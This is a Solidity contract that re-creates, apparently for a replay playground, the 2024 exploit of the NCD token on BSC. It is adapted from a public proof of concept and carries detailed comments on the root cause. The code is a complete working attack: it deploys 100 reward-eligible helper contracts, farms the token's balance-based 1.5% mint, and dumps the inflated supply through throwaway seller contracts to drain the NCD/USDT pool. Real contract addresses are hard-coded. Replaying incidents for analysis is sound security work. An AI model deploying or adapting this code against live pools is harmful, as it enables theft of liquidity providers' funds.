// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-NCD).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`EuroExploit.testExploit()`, attacker = address(this)) — there is no reusable
// `attack()` entrypoint to call, only a test function. This contract is a
// faithful, self-contained copy of that inline attack (the two helper contracts
// `LetTheContractHaveRewards` / `LetTheContractHaveUsdc` plus the orchestration
// loop) wrapped in a `run()` entrypoint so the playground can deploy and record
// it. Logic and constants are copied verbatim from test/NCD_exp.sol; the initial
// USDT funding (the two `deal()` cheatcode calls in the original test) is
// replicated by the config's `setup.dealToken` step instead of a cheatcode.
//
// Root cause: NCD.doReward() mints 1.5% of an address's CURRENT balance (not a
// time-weighted staked principal) to any address with mineStartTime != 0, and
// that eligibility is granted to any address that merely touches the pair.
// Cycling one large balance through 100 freshly-registered helper contracts
// compounds the 1.5%-per-pass mint into a ~4.5x free supply inflation, which is
// then dumped into the NCD/USDT pool via many small-sell "farmer" contracts.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface INcd is IERC20 {
    function mineStartTime(address) external view returns (uint256);
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// Registers itself as a reward-eligible "miner" (mineStartTime != 0), then lets
// the orchestrator cycle a large NCD balance through it: each ack() forwards the
// balance back but first mints 1.5% of it to itself via doReward(sender), then
// forwards that freshly-minted reward too.
contract LetTheContractHaveRewards {
    IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
    INcd ncd_ = INcd(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);

    // NOTE on the omitted final transfer: the original test's
    // preStartTimeRewards() ends with a THIRD transfer
    // (`ncd_.transfer(msg.sender, balanceOf(this))`) that forwards leftover
    // dust back to the caller. In the original multi-block-timestamp run this
    // is a no-op for minting purposes: mineStartTime[this] was JUST set by the
    // skim() buy-path moments earlier in the SAME transaction, so
    // `dayss = (now - mineStartTime) / 1 day == 0` and doReward(this) mints
    // nothing. The playground's replay runs the whole call at ONE fixed
    // block.timestamp, so this helper's mineStartTime is pre-backdated by
    // `setup` (see MINE_START_TIME_SLOT in the .mjs config) to make the LATER
    // ack() cycle see dayss=1. If this third transfer ran here, it would
    // consume that backdating immediately (minting once during registration
    // instead of during the mint-farm cycle) AND reset mineStartTime back to
    // "now", making the later ack() calls mint nothing at all - a single-
    // timestamp artifact that has no equivalent in the original two-timestamp
    // test. Omitting it leaves a few thousand NCD of dust stranded in each
    // helper (immaterial to the exploit's profit) and preserves the
    // backdated mineStartTime for the real mint-farm cycle below.
    function preStartTimeRewards() public {
        ncd_usdc_pair_.skim(address(this));
        ncd_.transfer(address(ncd_usdc_pair_), (ncd_.balanceOf(address(this)) * 5) / 100);
        require(ncd_.mineStartTime(address(this)) > 0);
    }

    function ack() public {
        // first transfer mints doReward(this) -> 1.5% of the received stack, THEN sends it
        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
        // second transfer sends the freshly-minted reward that landed on this contract
        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
    }
}

// Disposable dump contract: sells <=5% of its NCD allocation per call (dodging
// the token's per-address sellmaxrate/day throttle, since each is a fresh
// address with no lastSellTime) and forwards the proceeds back.
contract LetTheContractHaveUsdc {
    IERC20 private constant ncd_ = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IERC20 private constant usdc_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function withdraw() public {
        usdc_.approve(address(router), type(uint256).max);
        ncd_.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(ncd_);
        path[1] = address(usdc_);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            (ncd_.balanceOf(address(this)) * 5) / 100, 0, path, address(this), type(uint256).max
        );

        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
        usdc_.transfer(msg.sender, usdc_.balanceOf(address(this)));
    }
}

contract NcdDrain {
    IERC20 private constant ncd_ = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IERC20 private constant usdc_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);

    LetTheContractHaveRewards[] letTheContractHaveRewardss;

    // `run()` assumes the deployer/attacker (this contract) already holds 10 USDT
    // (the config's `setup.dealToken` step mirrors testExploit()'s first
    // `deal(address(usdc_), address(this), 10 ether)` — the "assume this is an
    // exchange for uniswap, not flashloan" seed capital). The second deal() (to
    // 10_000 ether) happens mid-attack in the original test; here it is step 1
    // below via a second dealToken-equivalent... but since a contract cannot
    // invoke `deal`, the config instead pre-funds the FULL 10_010 ether up front
    // (both deals set an ABSOLUTE balance, so pre-funding the final total before
    // the first swap is behaviorally identical to the original two-step deal:
    // the seed buy only spends 10 ether of it, leaving 10_000 ether untouched
    // until the big buy below spends exactly that).
    function run() external {
        usdc_.approve(address(router), type(uint256).max);
        ncd_.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(usdc_);
        path[1] = address(ncd_);

        // --- seed buy: 10 USDT -> NCD ---
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(10 ether, 0, path, address(this), type(uint256).max);
        ncd_.transfer(address(ncd_usdc_pair_), (ncd_.balanceOf(address(this)) * 5) / 100);

        // --- register 100 reward-eligible helper contracts ---
        for (uint256 i = 0; i < 100; i++) {
            LetTheContractHaveRewards letTheContractHaveRewards = new LetTheContractHaveRewards();
            letTheContractHaveRewards.preStartTimeRewards();
            letTheContractHaveRewardss.push(letTheContractHaveRewards);
        }

        // --- big buy: 10,000 USDT -> NCD (loads the stack to be cycled) ---
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            10_000 ether, 0, path, address(this), type(uint256).max
        );

        // --- cycle the whole stack through the 100 helpers: mint farm ---
        for (uint256 i = 0; i < letTheContractHaveRewardss.length; i++) {
            LetTheContractHaveRewards letTheContractHaveRewards = letTheContractHaveRewardss[i];
            ncd_.transfer(address(letTheContractHaveRewards), ncd_.balanceOf(address(this)));
            letTheContractHaveRewards.ack();
        }

        // --- drain the pool: spread the inflated NCD across disposable dumpers ---
        while (ncd_.balanceOf(address(this)) > 1000 ether) {
            LetTheContractHaveUsdc letTheContractHaveUsdc = new LetTheContractHaveUsdc();
            ncd_.transfer(address(letTheContractHaveUsdc), ncd_.balanceOf(address(this)));
            letTheContractHaveUsdc.withdraw();
        }

        // --- repay the modeled 10,030 USDT flash loan; keep the rest as profit ---
        usdc_.transfer(address(0xdead), 10_030 ether);

        // Forward the remaining USDT to the attacker EOA. The original test
        // measures profit as usdc_.balanceOf(address(this)) because
        // attacker == address(this) there (the test contract IS the profit
        // holder). Here the deployer/attacker is a plain EOA (msg.sender of
        // run(), not this contract), and the playground's profit measurement
        // takes its baseline BEFORE the setup step that pre-funds this
        // contract with working capital - so the true profit signal must
        // leave this contract and land on the attacker EOA to be measured
        // against that (correctly zero) pre-setup baseline.
        usdc_.transfer(msg.sender, usdc_.balanceOf(address(this)));
    }
}
